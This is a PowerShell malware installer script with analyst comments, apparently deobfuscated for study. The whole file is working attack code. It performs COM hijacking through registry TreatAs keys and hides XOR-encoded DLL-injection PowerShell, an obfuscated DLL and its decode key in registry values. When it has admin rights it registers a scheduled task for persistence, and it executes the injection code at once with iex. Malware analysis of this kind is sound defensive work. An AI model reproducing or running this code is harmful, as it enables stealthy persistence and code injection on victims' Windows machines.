# INPUT PARAMS...
    # $nr2: bytes, base64 decoded DLL, either 32 or 64 bit
    # $bx0: int, 14044 if DLL is 64 bit, 11498 if 32 bit
    # $ha5: bool, True
    # $dz4: bool, True

$se8 = $true;

# contains integer 0-15 mapped to by OS version and type recon
$ph7 = fi6;

# must be at least server 2008 R2
if ($ph7 -lt $xh8) { 
    return 
}

# $se8 is FALSE if running on Windows 10 workstation, else TRUE
if ($ph7 -eq $nm3) { 
    $se8 = $false 
}

# check if current process is running as builtin administrator
$os7 = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544");

# get random GUIDs, one non-random GUID, a path of a random currently registered scheduled task, and the
# name of another random currently registered scheduled task (see te2.ps1)
$po6 = te2 $os7;

# bug out if the above didn't work
if($po6){
}
else{ 
    return 
}

# if admin, assign $bh0 to random_GUID_3
if($os7) { 
    $ow2 = "lm";
    $bh0 = $po6[$ig1]
} 
# not admin, assign $bh0 to COM_hijacked_task_GUID 
# either {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} or {2DEA658F-54C1-4227-AF9B-260AB5FC3543} (random)
else {
    $ow2 = "cu";
    $bh0 = $po6[$oz8] 
}

# if admin, "hklm", if not "hkcu" 
$hf2 = "hk" + $ow2 + ":\software\classes";
$jz0 = $hf2;

# set reg key hk(lm|cu):\software\classes\<random_GUID_1>\CLSID
# and entry "(Default)" under hk(lm|cu):\software\classes\<random_GUID_1> with value <random_GUID_1>
$oy6 = $hf2+"\"+$po6[$za2];
New-Item -Path $oy6 -Name "CLSID" -force|Out-Null;
it2 $oy6 $po6[$za2];

# set entry "(Default)" under hk(lm|cu):\software\classes\<random_GUID_1>\CLSID with value <random_GUID_0>
it2 ($oy6+"\CLSID") $po6[$rp6];

# set reg key ...
#   if admin...
#       hklm:\software\classes\CLSID\<random_GUID_3\TreatAs
#   else...
#       hkcu:\software\classes\CLSID\<COM_hijacked_task_GUID>\TreatAs
#
# and entry "(Default)" under that key with value <random_GUID_0>
$hf2+="\CLSID";
$rh3 = $hf2+"\"+$bh0;
New-Item -Path $rh3 -Name "TreatAs" -force|Out-Null;
it2 ($rh3 + "\TreatAs") $po6[$rp6];

# set reg key...
# hk(lm|cu):\software\classes\CLSID\<random_GUID_0>
New-Item -Path $hf2 -Name $po6[$rp6] -force|Out-Null;
$hf2+=("\"+$po6[$rp6]);

$rc8 = Get-Random 255;

# rc5 contains last 4 characters of random_GUID_0
$du2=[System.Text.Encoding]::UTF8;
$rc5 = $du2.GetString($du2.GetBytes($po6[$rp6])[33..36]);

$da0 = $hf2+"\ProgID";

# build the powershell decode/run routine for the script that will be encoded and 
# stored in hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\ProgID
# IF NOT running on Win10 workstation, it runs mshta as a parent of the sb4 powershell
if ($se8) {
    $vd7 = sb4Mshta $da0 $rc5 $rc8
}
else {
    $vd7 = sb4 $da0 $rc5 $rc8 $false
}

# always true
if ($ha5) {
    # first 4 characters of random_GUID_0
    $bq3 = $du2.GetString($du2.GetBytes($po6[$rp6])[1..4]);

    # build DLL injection code 
    $bw5 = aw9 ($hf2+"\VersionIndependentProgID") $rc5 $bq3 $bx0 2;
}
else { 
    $bw5 = $nr2 
}

$ec2=$du2.GetBytes($bw5);
$hg8=$rc8;

# encode the powershell produced by aw9 with an XOR key that increments by 4 each byte, where the
# key resets back to zero once it reaches above 249
$bw5_ENC = ($(for($ya2=0; $ya2 -lt $ec2.length; $ya2++){
    if($hg8 -ge 250){
        $hg8=0
    }
    $ec2[$ya2] -bxor $hg8; 
    $hg8+=4
}));

# $zp7=<random_GUID_1>
$zp7=$po6[$za2];

foreach($df0 in @("","VersionIndependentProgID","ProgID","LocalServer")){

    # set reg keys and properties...
    #   hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\VersionIndependentProgID
    #       (Default): random_GUID_1
    #   hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\ProgID
    #       (Default): random_GUID_1
    #       last 4 chars of random GUID 0: Binary XOR encoded aw9-embedded.ps1
    #   hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\LocalServer
    #       (Default): loader for the DLL injection script in the ProgID key

    if($df0 -ne ""){ 
        New-Item -Path $hf2 -Name $df0 -force|Out-Null;
        $rh3 = $hf2+'\'+$df0 
    }

    if($df0 -eq "LocalServer") { 
        $zp7=$vd7 
    }

    # set the XOR obfuscated DLL injection powershell under entry <last_4_chars_of_random_GUID_0>
    if($df0 -eq "ProgID") { 
        New-ItemProperty -Path ($hf2+"\ProgID") -Name $rc5 -PropertyType Binary -Value $bw5_ENC -force|out-null 
    }

    # set (Default) properties
    it2 $rh3 $zp7
}

# if running as admin, register a scheduled task as persistence (see xq4) which points to the
# runner script for aw9-embedded.ps1
if($os7){ 
    xq4 $bh0 $po6[$ih4] $po6[$os8] 
}

# always true
if($ha5){

    # generate key for encode/decode
    $yr3 = nj0_uplow 32;

    # encode DLL with key
    $kt2 = ub3 $nr2 $yr3;

    $hf2 += "\VersionIndependentProgID";

    # write DLL and key to registry properties...
        # hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\VersionIndependentProgID
            # last_4_chars_of_GUID_0: obfuscated DLL
            # first_4_chars_of_GUID_0: obfuscated decode key
    New-ItemProperty -Path $hf2 -Name $rc5 -PropertyType Binary -Value $kt2 -force|out-null;
    New-ItemProperty -Path $hf2 -Name $bq3 -PropertyType Binary -Value (dc7-secret $yr3) -force|out-null;
}

# write registry entry...
    # hk(lm|cu):\software\classes
        # (Default): path to this script
it2 $jz0 $mz6;

# always true, run aw9-embedded.ps1 immediately
if($dz4){ 
    iex($bw5) 
}